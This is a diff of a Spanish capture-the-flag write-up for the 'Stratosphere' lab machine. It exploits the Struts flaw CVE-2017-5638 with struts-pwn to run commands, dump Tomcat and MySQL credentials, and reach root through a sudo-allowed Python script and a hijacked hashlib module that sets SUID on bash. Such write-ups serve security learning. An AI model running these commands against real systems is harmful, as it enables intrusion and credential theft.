@@ -30,13 +30,13 @@ image:
   
 ## Descripción
 
-`Stratosphere` es una máquina `medium linux` donde estaremos vulnerando la máquina a través de un `rce` (remote code execution), el cual obtenemos al `explotar` el `CVE-2017-5638` de `Struts`. Mediante el rce `accedemos` a la `base de datos` y `obtenemos` las `credenciales` de acceso al `ssh` de la máquina víctima, una vez dentro nos convertimos en usuario root `abusando` del `sudoers`
+Stratosphere es una máquina medium linux donde estaremos vulnerando la máquina a través de un rce (remote code execution), el cual obtenemos al explotar el CVE-2017-5638 de Struts. Mediante el rce accedemos a la base de datos y obtenemos las credenciales de acceso al ssh de la máquina víctima, una vez dentro nos convertimos en usuario root abusando del sudoers
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.252.189
@@ -51,7 +51,7 @@ rtt min/avg/max/mdev = 60.490/61.847/63.205/1.357 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
+Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.252.189 -oG openPorts
@@ -77,7 +77,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.64 seconds
            Raw packets sent: 196629 (8.652MB) | Rcvd: 35 (1.620KB)
 ```
 
-Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 22,80,8080 10.129.252.189 -oN services
@@ -290,11 +290,11 @@ Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
 
 ### Web Enumeration
 
-El servicio web en el `puerto 80` y en el `puerto 8080` son `exactamente` las `mismas` páginas `web`
+El servicio web en el puerto 80 y en el puerto 8080 son exactamente las mismas páginas web
 
 ![](/assets/img/Stratosphere/image_1.png)
 
-`Fuzzeamos` en busca de rutas
+Fuzzeamos en busca de rutas
 
 ```
 wfuzz -c -t200 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.252.189/FUZZ      
@@ -314,36 +314,36 @@ ID           Response   Lines    Word       Chars       Payload
 000013276:   302        0 L      0 W        0 Ch        "Monitoring"                
 ```
 
-Cuando accedemos a `http://10.129.252.189/Monitoring` vemos esta página
+Cuando accedemos a http://10.129.252.189/Monitoring vemos esta página
 
 ![](/assets/img/Stratosphere/image_2.png)
 
-Si accedemos a `http://10.129.252.189/manager` nos aparece lo siguiente
+Si accedemos a http://10.129.252.189/manager nos aparece lo siguiente
 
 ![](/assets/img/Stratosphere/image_3.png)
 
-Al cancelar vemos lo siguiente, por lo tanto ya sabemos que hay un `tomcat` corriendo
+Al cancelar vemos lo siguiente, por lo tanto ya sabemos que hay un tomcat corriendo
 
 ![](/assets/img/Stratosphere/image_4.png)
 
-Identificamos la `versión` del `tomcat`, en este caso es la versión `8.5.54`
+Identificamos la versión del tomcat, en este caso es la versión 8.5.54
 
 ```
 # curl -s http://10.129.252.189:8080/docs/ | grep Tomcat    
 <!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;docs&#47;</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/8.5.54 (Debian)</h3></body></html>
 ```
 
-He `fuzzeado` rutas y no he encontrado nada, por lo tanto he hecho la siguiente `búsqueda` en google `.action exploit`, debido a que esa `extensión` es bastante `curiosa`. Esta es la `primera` `búsqueda` que nos `sale`
+He fuzzeado rutas y no he encontrado nada, por lo tanto he hecho la siguiente búsqueda en google .action exploit, debido a que esa extensión es bastante curiosa. Esta es la primera búsqueda que nos sale
 
 ![](/assets/img/Stratosphere/image_5.png)
 
-Al `no` poder `comprobar` la `version` del `struts` hay que ir probando `exploit` hasta dar con el indicado, en esta caso hemos tenido suerte y hemos dado con el a la primera. Lo que debemos hacer es `clonarnos` el `repositorio` de `github`
+Al no poder comprobar la version del struts hay que ir probando exploit hasta dar con el indicado, en esta caso hemos tenido suerte y hemos dado con el a la primera. Lo que debemos hacer es clonarnos el repositorio de github
 
 ```
 # git clone https://github.com/mazen160/struts-pwn
 ```
 
-`Ejecutamos` el `exploit` y obtenemos `ejecución remota de comandos`
+Ejecutamos el exploit y obtenemos ejecución remota de comandos
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'id' 
@@ -362,7 +362,7 @@ uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
 [%] Done.
 ```
 
-He intentado establecerme una `reverse shell` pero no ha sido posible, por lo tanto voy a `listar` el `contenido` de la máquina víctima
+He intentado establecerme una reverse shell pero no ha sido posible, por lo tanto voy a listar el contenido de la máquina víctima
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'ls -a'  
@@ -387,7 +387,7 @@ webapps
 work
 ```
 
-`Listamos` el contenido de `/conf`
+Listamos el contenido de /conf
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'ls conf'           
@@ -416,7 +416,7 @@ web.xml.dpkg-dist
 [%] Done.
 ```
 
-`Visualizamos` el contenido de `tomcat-users.xml` y obtenemos un `usuario` y `contraseña`
+Visualizamos el contenido de tomcat-users.xml y obtenemos un usuario y contraseña
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'cat conf/tomcat-users.xml'           
@@ -479,7 +479,7 @@ Note: Server Connection Closed Prematurely
 [%] Done.
 ```
 
-He probado varias combinaciones para el panel de `/manger/html`, con el objetivo de autenticarme y subir un `.war malicioso` con el que ganar `acceso` a la `máquina víctima` pero `no` ha sido `posible`. Por lo tanto vamos a visualizar el contenido de `db_connect`, donde obtenemos varias `credenciales` para la `base de datos`
+He probado varias combinaciones para el panel de /manger/html, con el objetivo de autenticarme y subir un .war malicioso con el que ganar acceso a la máquina víctima pero no ha sido posible. Por lo tanto vamos a visualizar el contenido de db_connect, donde obtenemos varias credenciales para la base de datos
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'cat db_connect'    
@@ -504,7 +504,7 @@ pass=admin
 [%] Done.
 ```
 
-Ahora que tenemos las credenciales, vamos a `conectarnos` a la `base de datos` mediante el rce del que disponemos y a `listar` las `bases de datos` disponibles
+Ahora que tenemos las credenciales, vamos a conectarnos a la base de datos mediante el rce del que disponemos y a listar las bases de datos disponibles
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "show databases;"'   
@@ -525,7 +525,7 @@ users
 [%] Done.
 ```
 
-`Listamos tablas` de la `base de datos` de `users`
+Listamos tablas de la base de datos de users
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; show tables;"'      
@@ -545,7 +545,7 @@ accounts
 [%] Done.
 ```
 
-`Listamos columnas` de la `tabla accounts` en la `base de datos users`
+Listamos columnas de la tabla accounts en la base de datos users
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; describe accounts;"'        
@@ -567,7 +567,7 @@ username        varchar(20)     YES             NULL
 [%] Done.
 ```
 
-Obtenemos el contenido de las columnas `username` y `password` de la `tabla accounts` y de la `base de datos accounts`
+Obtenemos el contenido de las columnas username y password de la tabla accounts y de la base de datos accounts
 
 ```
 # python struts-pwn.py --url 'http://10.129.252.189/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; select password,username from accounts;"'             
@@ -589,7 +589,7 @@ password        username
 
 ## Intrusión
 
-Accedemos por `ssh` a la máquina víctima con las `credenciales` conseguidas a través de `mysql`
+Accedemos por ssh a la máquina víctima con las credenciales conseguidas a través de mysql
 
 ```
 #  ssh richard@10.129.252.189   
@@ -609,7 +609,7 @@ richard
 
 ## Privilege Escalation (First Method)
 
-Vemos que nuestro usuario puede ejecutar `python` con `sudo` siempre y cuando ejecute un archivo que está en nuestro directorio `/home`
+Vemos que nuestro usuario puede ejecutar python con sudo siempre y cuando ejecute un archivo que está en nuestro directorio /home
 
 ```
 richard@stratosphere:~$ sudo -l
@@ -620,7 +620,7 @@ User richard may run the following commands on stratosphere:
     (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
 ```
 
-`Aunque` el `propietario` sea `root`, está en nuestro directorio `/home`,  en el cual tenemos permisos `rwx` para todo, por lo tanto podemos `eliminar` el `archivo`
+Aunque el propietario sea root, está en nuestro directorio /home,  en el cual tenemos permisos rwx para todo, por lo tanto podemos eliminar el archivo
 
 ```
 richard@stratosphere:~$ ls -l
@@ -634,7 +634,7 @@ richard@stratosphere:~$ ls
 Desktop  user.txt
 ```
 
-Lo siguiente que vamos a hacer es crear otro archivo `test.py` con este `contenido`, de modo que al ejecutarlo con python nos spawnee una `bash` como usuario `root`
+Lo siguiente que vamos a hacer es crear otro archivo test.py con este contenido, de modo que al ejecutarlo con python nos spawnee una bash como usuario root
 
 ```
 import os
@@ -647,7 +647,7 @@ if __name__ == "__main__":
 
 ```
 
-Nos `convertimos` en usuario `root`
+Nos convertimos en usuario root
 
 ```
 richard@stratosphere:~$ sudo /usr/bin/python /home/richard/test.py 
@@ -656,7 +656,7 @@ root@stratosphere:/home/richard#
 
 ## Privilege Escalation (Second Method)
 
-Vemos que se están usando `librerías` sin indicar un `path` para ellas
+Vemos que se están usando librerías sin indicar un path para ellas
 
 ```
 richard@stratosphere:~$ cat test.py 
@@ -700,14 +700,14 @@ def question():
 question()
 ```
 
-`Imprimimos` el `path` de `python`, en este caso nos viene por defecto empezar a buscar las `librerías` en el `directorio actual`
+Imprimimos el path de python, en este caso nos viene por defecto empezar a buscar las librerías en el directorio actual
 
 ```
 richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
 ['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/gtk-2.0']
 ```
 
-Nos creamos en el `directorio actual` la librería` hashlib.py` con el siguiente `contenido`
+Nos creamos en el directorio actual la librería hashlib.py con el siguiente contenido
 
 ```
 import os
@@ -715,7 +715,7 @@ import os
 os.system('chmod u+s /bin/bash')
 ```
 
-`Ejecutamos` el script
+Ejecutamos el script
 
 ```
 richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
@@ -729,14 +729,14 @@ Traceback (most recent call last):
 AttributeError: module 'hashlib' has no attribute 'md5'
 ```
 
-`Comprobamos` que se haya `añadido` el `privilegio SUID` a la `bash`
+Comprobamos que se haya añadido el privilegio SUID a la bash
 
 ```
 richard@stratosphere:~$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 ```
 
-`Ejecutamos` la `bash` como el `propietario` y nos `convertimos` en `root`
+Ejecutamos la bash como el propietario y nos convertimos en root
 
 ```
 richard@stratosphere:~$ bash -p
